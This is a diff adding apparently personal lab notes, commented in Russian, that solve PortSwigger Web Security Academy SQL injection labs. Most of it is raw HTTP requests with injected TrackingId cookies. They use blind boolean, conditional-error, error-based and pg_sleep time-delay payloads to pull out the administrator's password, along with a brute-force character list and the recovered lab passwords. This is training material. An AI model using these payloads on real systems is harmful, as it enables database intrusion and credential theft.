@@ -268,4 +268,295 @@ Priority: u=0, i
 
 administrator=yitm9fqzlwppm0x64pht
 
-
+7) Lab: Blind SQL injection with conditional responses
+ 
+GET / HTTP/2
+Host: 0a5700ee047177b980d7e4e600690054.web-security-academy.net
+Cookie: TrackingId=gEuWmczfq3Gnxylc'+AND+LENGTH((SELECT+password+FROM+users+WHERE+username%3d'administrator'))%3d20+--+; session=cUH1dyd70QD40JOspE9fup2WGQVtkzve
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a5700ee047177b980d7e4e600690054.web-security-academy.net/filter?category=Gifts
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+ 
+---
+ 
+LENGTH = 20
+ 
+---
+ 
+GET / HTTP/2
+Host: 0a5700ee047177b980d7e4e600690054.web-security-academy.net
+Cookie: TrackingId=gEuWmczfq3Gnxylc'+AND+1%3d1+--+; session=cUH1dyd70QD40JOspE9fup2WGQVtkzve
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a5700ee047177b980d7e4e600690054.web-security-academy.net/filter?category=Gifts
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+ 
+---
+ 
+gEuWmczfq3Gnxylc' AND SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='2' -- 
+ 
+---
+ 
+import string
+ 
+# Собираем символы в нужном порядке
+all_characters = (
+    string.ascii_lowercase +  # Маленькие буквы (a-z)
+    string.ascii_uppercase +  # Большие буквы (A-Z)
+    string.digits +           # Цифры (0-9)
+    string.punctuation        # Все возможные спецсимволы (!, @, # и т.д.)
+)
+ 
+# Выводим каждый символ в столбик
+for char in all_characters:
+    print(char)
+    
+---
+ 
+To Intruder
+ 
+->
+ 
+GET / HTTP/2
+Host: 0a5700ee047177b980d7e4e600690054.web-security-academy.net
+Cookie: TrackingId=gEuWmczfq3Gnxylc'+AND+SUBSTR((SELECT+password+FROM+users+WHERE+username%3d'administrator'),1,1)%3d'2'+--+; session=cUH1dyd70QD40JOspE9fup2WGQVtkzve
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a5700ee047177b980d7e4e600690054.web-security-academy.net/filter?category=Gifts
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+ 
+->
+ 
+administrator
+2dtbgihzy4h5xyygtylr
+ 
+8) Lab: Blind SQL injection with conditional errors
+ 
+GET /filter?category=Accessories HTTP/2
+Host: 0a1f00bc046a1022800e1c4700c4004e.web-security-academy.net
+Cookie: TrackingId=RP5SGshhOv9LS9na'+UNION+SELECT+(CASE+WHEN+1=1+THEN+NULL+ELSE+chr(-1)+END)+FROM+dual+--+; session=bIrzYlriGgDjKWzJfl3W3UNBabYceQL9
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a1f00bc046a1022800e1c4700c4004e.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+ 
+---
+ 
+GET /filter?category=Accessories HTTP/2
+Host: 0a1f00bc046a1022800e1c4700c4004e.web-security-academy.net
+Cookie: TrackingId=RP5SGshhOv9LS9na'+UNION+SELECT+(CASE+WHEN+LENGTH((SELECT+password+FROM+users+WHERE+username='administrator'))=20+THEN+NULL+ELSE+chr(-1)+END)+FROM+dual+--+; session=bIrzYlriGgDjKWzJfl3W3UNBabYceQL9
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a1f00bc046a1022800e1c4700c4004e.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+ 
+---
+ 
+GET /filter?category=Accessories HTTP/2
+Host: 0a1f00bc046a1022800e1c4700c4004e.web-security-academy.net
+Cookie: TrackingId=RP5SGshhOv9LS9na'+UNION+SELECT+(CASE+WHEN+SUBSTR((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='x'+THEN+NULL+ELSE+chr(-1)+END)+FROM+dual+--+; session=bIrzYlriGgDjKWzJfl3W3UNBabYceQL9
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a1f00bc046a1022800e1c4700c4004e.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+ 
+---
+ 
+administrator
+xh647nycdx3v9nr45gnl
+ 
+9) Lab: Visible error-based SQL injection
+ 
+GET /filter?category=Pets HTTP/2
+Host: 0aad001a036f55ab81f82598004500bb.web-security-academy.net
+Cookie: TrackingId='+AND+1%3dCAST((SELECT+username+FROM+users+LIMIT+1)+AS+int)--+; session=howa1o5U1DaLi9ooGWQrQwP24z3U4lfY
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0aad001a036f55ab81f82598004500bb.web-security-academy.net/filter?category=Accessories
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+ 
+---
+ 
+GET /filter?category=Pets HTTP/2
+Host: 0aad001a036f55ab81f82598004500bb.web-security-academy.net
+Cookie: TrackingId='+AND+1%3dCAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)--+; session=howa1o5U1DaLi9ooGWQrQwP24z3U4lfY
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0aad001a036f55ab81f82598004500bb.web-security-academy.net/filter?category=Accessories
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+ 
+---
+ 
+administrator
+b0vvm3qbg0wt2b4husw0
+ 
+10) Lab: Blind SQL injection with time delays and information retrieval
+ 
+GET /filter?category=Clothing%2c+shoes+and+accessories HTTP/2
+Host: 0a3c00d203600eb28064c645001c0040.web-security-academy.net
+Cookie: TrackingId=1YF24F3KuqEf0ck3'%3bSELECT+pg_sleep(10)+--+; session=pj3Gio1JwSaa3pEgrR6504pfC7LQbst4
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a3c00d203600eb28064c645001c0040.web-security-academy.net/filter?category=Accessories
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+ 
+---
+ 
+GET /filter?category=Clothing%2c+shoes+and+accessories HTTP/2
+Host: 0a3c00d203600eb28064c645001c0040.web-security-academy.net
+Cookie: TrackingId=1YF24F3KuqEf0ck3'%3bSELECT+CASE+WHEN+1=1+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+--+; session=pj3Gio1JwSaa3pEgrR6504pfC7LQbst4
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a3c00d203600eb28064c645001c0040.web-security-academy.net/filter?category=Accessories
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+ 
+---
+ 
+GET /filter?category=Clothing%2c+shoes+and+accessories HTTP/2
+Host: 0a3c00d203600eb28064c645001c0040.web-security-academy.net
+Cookie: TrackingId=1YF24F3KuqEf0ck3'%3bSELECT+CASE+WHEN+LENGTH((SELECT+password+FROM+users+WHERE+username='administrator'))=20+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+--+; session=pj3Gio1JwSaa3pEgrR6504pfC7LQbst4
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a3c00d203600eb28064c645001c0040.web-security-academy.net/filter?category=Accessories
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+ 
+---
+ 
+GET /filter?category=Clothing%2c+shoes+and+accessories HTTP/2
+Host: 0a3c00d203600eb28064c645001c0040.web-security-academy.net
+Cookie: TrackingId=1YF24F3KuqEf0ck3'%3bSELECT+CASE+WHEN+SUBSTR((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='x'+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+--+; session=pj3Gio1JwSaa3pEgrR6504pfC7LQbst4
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a3c00d203600eb28064c645001c0040.web-security-academy.net/filter?category=Accessories
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+ 
+---
+ 
+administrator
+579g2lz3bvwwomr13hdb
+ 
+11) Lab: Blind SQL injection with out-of-band interaction
+ 
+https://beauknows.tech/posts/collaborator-alternatives/
+ 
